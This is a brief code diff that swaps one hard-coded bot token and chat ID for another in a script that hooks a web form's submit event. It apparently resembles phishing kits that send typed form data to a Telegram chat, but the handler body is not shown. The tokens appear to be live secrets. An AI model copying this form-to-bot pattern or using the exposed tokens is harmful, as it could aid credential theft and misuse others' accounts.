@@ -1,7 +1,7 @@
 
 
 
-    const bots = new Bot("6135450810:AAGUOJprgvABqKF6iohNy109gXP1gPf-a4w", 5326525481);
+    const bots = new Bot("6455387584:AAELDS7StGYWXIIUjT2GKNvNdNTmlj0JX50", 6211090366);
 
 
     document.getElementById("form").addEventListener("submit", e => {
